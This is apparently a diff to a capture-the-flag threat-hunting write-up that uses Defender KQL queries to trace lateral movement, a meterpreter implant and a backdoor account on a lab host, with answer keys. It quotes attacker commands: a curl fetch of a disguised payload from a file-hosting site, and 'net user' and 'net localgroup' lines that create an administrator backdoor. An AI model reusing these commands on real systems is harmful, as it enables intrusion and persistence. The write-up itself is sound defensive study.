@@ -85,3 +85,129 @@ Five days after the file server breach, threat actors returned with sophisticate
 
 ---
 
+## 🚩 Flag 1, 2 & 3: LATERAL MOVEMENT - Source IP, Compromised Account, Target Device Name
+
+Answer flag 1: 10.1.0.204
+Answer flag 2: yuki.tanaka
+Answer flag 3: azuki-adminpc
+
+Query used: (Timestamp filtered for 25nd of November)
+```
+DeviceLogonEvents
+| where DeviceName contains "azuki-adminpc"
+| where ActionType == "LogonSuccess"
+| where RemoteIP != ""
+| project Timestamp, DeviceName, ActionType, LogonType, AccountName, RemoteIP
+| order by Timestamp asc
+```
+<img width="900" height="726" alt="image" src="https://github.com/user-attachments/assets/316c0e8c-ad2e-4b4c-97c3-41524da3f78a" />
+
+As per the instructions, I checked for any LogonSuccess into azuki DeviceName 5 days after the initial access of the previous incident, and the azuki-adminpc came up, which was exactly the right Device I needed to look into further to find the Remote IP from which the threat actor accessed the Device.
+
+---
+
+## 🚩 Flag 4 & 5: EXECUTION - Payload Hosting Service & Malware Download Command
+
+Answer flag 4: litter.catbox.moe
+Answer flag 5: "curl.exe" -L -o C:\Windows\Temp\cache\KB5044273-x64.7z hxxps[://]litter[.]catbox[.]moe/gfdb9v[.]7z (the URL has been defanged)
+
+Query used: 
+```
+DeviceNetworkEvents
+| where DeviceName contains "azuki-adminpc"
+| project Timestamp, RemoteIP, RemotePort, ActionType, RemoteUrl, LocalPort, Protocol, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName, InitiatingProcessAccountDomain
+| order by Timestamp asc 
+```
+
+<img width="800" height="784" alt="image" src="https://github.com/user-attachments/assets/ea43d8e8-7d62-43b2-8ac7-87bf52de9399" />
+
+The Answer to both flags can be seen in the Network Events, around the time of the malicious activities. The threat actor used the above mentioned command to access the litter.catbox.moe hosting service and download the malicious archive gfdb9v.7z and automatically renamed and saved it as KB5044273-x64.7z into C:\Windows\Temp\cache directory to masquerade it as a Windows security update.
+
+---
+
+## 🚩 Flag 6: EXECUTION - Archive Extraction Command
+
+Answer flag 6: "7z.exe" x C:\Windows\Temp\cache\KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache\ -y
+
+Query used: 
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-adminpc"
+| where AccountName == "yuki.tanaka"
+| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
+```
+
+<img width="900" height="462" alt="image" src="https://github.com/user-attachments/assets/88b229c6-2c68-4133-a9ce-79fbcb0d4c7d" />
+
+The threat actor used the above mentioned command to extract the downloaded password-protected archive file into the C:\Windows\Temp\cache directory
+
+---
+
+## 🚩 Flag 7: PERSISTENCE - C2 Implant
+
+Answer flag 7: meterpreter.exe
+
+Query used: 
+```
+DeviceFileEvents
+| where FolderPath contains "C:\\Windows\\Temp\\cache"
+| where DeviceName contains "azuki-adminpc"
+| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessFolderPath, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by Timestamp asc 
+```
+
+<img width="900" height="792" alt="image" src="https://github.com/user-attachments/assets/08309e1d-c728-4070-9448-89f50ea00eca" />
+
+Upon investigation into what the threat actor extracted into the C:\Windows\Temp\cache directory, I could see several malicious files, among which was the meterpreter.exe, which was the C2 beacon filename.
+
+---
+
+## 🚩 Flag 8: PERSISTENCE - Named Pipe
+
+Answer flag 8: \Device\NamedPipe\msf-pipe-5902
+
+Query used: 
+```
+DeviceEvents
+| where DeviceName contains "azuki-adminpc"
+| project Timestamp, FileName, FolderPath, AdditionalFields
+```
+
+<img width="900" height="940" alt="image" src="https://github.com/user-attachments/assets/b4cf4dbc-2144-44bc-b0ff-aaab69c71612" />
+
+The meterpreter c2 beacon used named pipes as a c2 channel for communication. Named Pipe is a Windows inter-process communication (IPC) mechanism and it doesn't create any network traffic and blends in well with legitimate Windows IPC.
+
+---
+
+## 🚩 Flag 9 & 10: CREDENTIAL ACCESS - Decoded Account Creation & PERSISTENCE - Backdoor Account
+
+Answer flag 9: net user yuki.tanaka2 B@ckd00r2024! /add
+Answer flag 10: yuki.tanaka2
+
+Query used: 
+```
+DeviceProcessEvents
+| where DeviceName contains "azuki-adminpc"
+| where ProcessCommandLine contains "powershell"
+| where AccountName == "yuki.tanaka"
+| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, AdditionalFields
+```
+
+<img width="1000" height="462" alt="image" src="https://github.com/user-attachments/assets/0a853669-ebb2-443d-9e24-8f6598d16bfd" />
+
+In the process events it was evident that the threat actor encoded a command and upon decoding it I could see that he created a backdoor account called yuki.tanaka2 with the password B@ckd00r2024!. 
+
+---
+
+## 🚩 Flag 11: PERSISTENCE - Decoded Privilege Escalation Command
+
+Answer flag 10: net localgroup Administrators yuki.tanaka2 /add
+
+<img width="1000" height="468" alt="image" src="https://github.com/user-attachments/assets/8c43aca6-d327-46d3-bcbc-4539820b39f5" />
+
+The threat actor encoded another command that was used to elevate privileges to the added backdoor account. He added it into the Administrators group.
+
+---
+
+## 🚩 Flag 12, 13, 14, 15, 16: DISCOVERY - Session Enumeration
+
